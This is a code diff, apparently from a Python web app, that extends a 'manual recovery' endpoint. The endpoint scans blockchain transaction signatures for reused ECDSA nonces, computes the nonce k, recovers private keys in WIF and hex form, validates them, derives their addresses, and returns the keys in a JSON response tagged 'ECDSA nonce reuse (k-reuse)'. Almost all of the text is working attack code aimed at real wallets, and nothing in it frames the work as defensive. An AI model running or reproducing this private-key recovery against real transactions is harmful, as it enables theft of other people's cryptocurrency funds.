@@ -1783,7 +1783,9 @@ def dashboard_stats():
                                                         'z': z,
                                                         'txid': txid
                                                     }
-                                                ]
+                                                ],
+                                                'block_height': block_height,
+                                                'block_hash': block_data.get('id')
                                             }
                                         else:
                                             r_value_map[r_hex] = {
@@ -1847,44 +1849,99 @@ def test_manual_recovery():
         
         # Try different signature pairs for recovery
         recovery_attempts = []
-        
+        successful_recovery = None
+        attempt_pairs_evaluated = 0
+
         for i in range(len(signatures)):
             for j in range(i + 1, len(signatures)):
                 sig1 = signatures[i]
                 sig2 = signatures[j]
-                
+
+                attempt_pairs_evaluated += 1
+
+                k_value_hex = None
+                try:
+                    numerator = (sig1['z'] - sig2['z']) % analyzer.N
+                    denominator = (sig1['s'] - sig2['s']) % analyzer.N
+                    if denominator != 0:
+                        denominator_inv = pow(denominator, analyzer.N - 2, analyzer.N)
+                        k_value = (numerator * denominator_inv) % analyzer.N
+                        k_value_hex = hex(k_value)
+                    else:
+                        logging.debug("Skipping pair due to zero denominator when computing nonce k")
+                except Exception as nonce_error:
+                    logging.debug(f"Failed to compute nonce for signature pair ({i}, {j}): {nonce_error}")
+
                 # Attempt private key recovery using k-reuse attack
                 recovered_key = analyzer._recover_private_key_from_k_reuse(
                     r, sig1['s'], sig2['s'], sig1['z'], sig2['z']
                 )
-                
+
                 if recovered_key:
                     # Validate the recovered key
                     validation_result = analyzer._validate_recovered_private_key(
                         recovered_key, r, sig1['s'], sig1['z']
                     )
-                    
+
                     # Generate addresses from the recovered key
                     addresses = analyzer._generate_addresses_from_wif(recovered_key)
-                    
-                    recovery_attempts.append({
-                        'signature_pair': (i, j),
-                        'recovered_private_key': recovered_key,
+
+                    private_key_hex = validation_result.get('private_key_hex')
+                    if isinstance(private_key_hex, str):
+                        private_key_hex = private_key_hex[2:] if private_key_hex.startswith('0x') else private_key_hex
+                        private_key_hex = private_key_hex.zfill(64)
+
+                    attempt_details = {
+                        'signature_pair': [i, j],
+                        'transaction_ids': [sig1['txid'], sig2['txid']],
+                        'k_value': k_value_hex,
+                        'private_key_wif': recovered_key,
+                        'private_key_hex': private_key_hex,
                         'validation_result': validation_result,
                         'addresses': addresses,
-                        'transaction_ids': [sig1['txid'], sig2['txid']]
-                    })
-        
+                        'r_value': hex(r),
+                        's_values': [sig1['s'], sig2['s']],
+                        'z_values': [sig1['z'], sig2['z']]
+                    }
+
+                    recovery_attempts.append(attempt_details)
+
+                    if validation_result.get('valid') and not successful_recovery:
+                        successful_recovery = {
+                            'private_key_wif': recovered_key,
+                            'private_key_hex': private_key_hex,
+                            'attack_method': 'ECDSA nonce reuse (k-reuse)',
+                            'recovery_pair': {
+                                'indices': [i, j],
+                                'transactions': [sig1['txid'], sig2['txid']]
+                            },
+                            'k_value': k_value_hex,
+                            'transaction_ids': [sig1['txid'], sig2['txid']],
+                            'primary_transaction_id': sig1['txid'],
+                            'block_height': test_data.get('block_height'),
+                            'block_hash': test_data.get('block_hash'),
+                            'r_value': hex(r),
+                            's_values': [sig1['s'], sig2['s']],
+                            'addresses': addresses,
+                            'validation_result': validation_result
+                        }
+
         return jsonify({
             'success': True,
             'test_data': {
                 'r': hex(r),
                 'signatures_count': len(signatures),
-                'transaction_ids': [sig['txid'] for sig in signatures]
+                'transaction_ids': [sig['txid'] for sig in signatures],
+                'block_height': test_data.get('block_height'),
+                'block_hash': test_data.get('block_hash')
             },
             'recovery_attempts': recovery_attempts,
             'total_attempts': len(recovery_attempts),
-            'successful_recoveries': len([attempt for attempt in recovery_attempts if attempt['validation_result']['valid']])
+            'successful_recoveries': len([
+                attempt for attempt in recovery_attempts if attempt['validation_result'].get('valid')
+            ]),
+            'attempt_pairs_evaluated': attempt_pairs_evaluated,
+            'successful_recovery': successful_recovery
         })
         
     except Exception as e:
